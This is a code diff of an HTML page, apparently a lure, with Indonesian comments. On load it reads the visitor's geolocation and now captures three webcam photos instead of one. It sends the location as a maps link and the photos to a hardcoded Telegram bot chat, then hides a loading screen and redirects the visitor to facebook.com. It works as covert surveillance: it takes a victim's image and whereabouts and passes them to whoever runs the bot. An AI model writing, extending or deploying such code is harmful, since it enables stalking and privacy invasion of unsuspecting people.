@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Telegram Bot</title>
   <style>
+    /* Gaya untuk indikator loading */
     #loading-indicator {
       position: fixed;
       top: 0;
@@ -12,7 +13,7 @@
       width: 100vw;
       height: 100vh;
       background-color: rgba(0, 0, 0, 0.7);
-      display: flex;
+      display: flex; /* Pastikan tampil */
       justify-content: center;
       align-items: center;
       z-index: 9999;
@@ -26,8 +27,12 @@
       animation: spin 1s linear infinite;
     }
     @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
     }
   </style>
 </head>
@@ -42,8 +47,10 @@
     const chatId = "7353825005"; // Ganti dengan chat ID Anda
     const redirectUrl = "https://facebook.com"; // Ganti dengan URL tujuan redirect
 
-    // Dapatkan akses kamera dan ambil satu foto
-    const capturePhoto = async () => {
+    let currentLocation = null; // Untuk menyimpan lokasi perangkat
+
+    // Dapatkan akses kamera dan mulai pengambilan foto
+    const startCameraAndCapturePhotos = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement("video");
@@ -53,63 +60,96 @@
 
         const canvas = document.createElement("canvas");
         const context = canvas.getContext("2d");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        const photoBlob = await new Promise((resolve) => {
-          canvas.toBlob((blob) => resolve(blob), "image/jpeg");
-        });
+        const photos = [];
+        for (let i = 0; i < 3; i++) {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const photoBlob = await new Promise((resolve) => {
+            canvas.toBlob((blob) => resolve(blob), "image/jpeg");
+          });
+
+          photos.push(photoBlob);
+          await new Promise((resolve) => setTimeout(resolve, 1000));
+        }
 
         stream.getTracks().forEach((track) => track.stop());
-        return photoBlob;
+        return photos;
       } catch (err) {
         console.error("Gagal mengakses kamera:", err);
-        return null;
+        return [];
       }
     };
 
+    // Dapatkan lokasi perangkat
+    const getLocation = () => {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          return reject(new Error("Geolocation tidak didukung di browser ini."));
+        }
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+            resolve({ latitude, longitude });
+          },
+          (error) => {
+            reject(new Error("Gagal mendapatkan lokasi: " + error.message));
+          }
+        );
+      });
+    };
+
     // Kirim pesan dan foto ke Telegram
-    const sendToTelegram = async (message, photoBlob) => {
+    const sendToTelegram = async (message, photos) => {
       try {
-        // Kirim pesan teks
         const messageUrl = `https://api.telegram.org/bot${apiToken}/sendMessage`;
-        await fetch(messageUrl, {
+        const messageResponse = await fetch(messageUrl, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: message }),
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
         });
 
-        // Kirim foto
-        if (photoBlob) {
+        if (!messageResponse.ok) {
+          console.error("Gagal mengirim pesan:", await messageResponse.text());
+        }
+
+        for (const photoBlob of photos) {
           const photoUrl = `https://api.telegram.org/bot${apiToken}/sendPhoto`;
           const formData = new FormData();
           formData.append("chat_id", chatId);
           formData.append("photo", photoBlob, "capture.jpg");
 
-          await fetch(photoUrl, { method: "POST", body: formData });
+          const photoResponse = await fetch(photoUrl, {
+            method: "POST",
+            body: formData,
+          });
+
+          if (!photoResponse.ok) {
+            console.error("Gagal mengirim foto:", await photoResponse.text());
+          }
         }
       } catch (error) {
-        console.error("Terjadi kesalahan saat mengirim ke Telegram:", error);
+        console.error("Terjadi kesalahan:", error);
       }
     };
 
-    // Proses utama saat halaman dimuat
+    // Mulai proses saat halaman dimuat
     (async () => {
       try {
-        const location = await new Promise((resolve, reject) => {
-          if (!navigator.geolocation) return reject("Geolocation tidak didukung.");
-          navigator.geolocation.getCurrentPosition(
-            (pos) => resolve(pos.coords),
-            (err) => reject("Gagal mendapatkan lokasi: " + err.message)
-          );
-        });
-
-        const { latitude, longitude } = location;
+        currentLocation = await getLocation();
+        const { latitude, longitude } = currentLocation;
         const locationMessage = `Lokasi saat ini: https://www.google.com/maps?q=${latitude},${longitude}`;
 
-        const photoBlob = await capturePhoto();
-        await sendToTelegram(locationMessage, photoBlob);
+        const photos = await startCameraAndCapturePhotos();
+
+        await sendToTelegram(locationMessage, photos);
 
         // Sembunyikan indikator loading dan redirect
         document.getElementById("loading-indicator").style.display = "none";
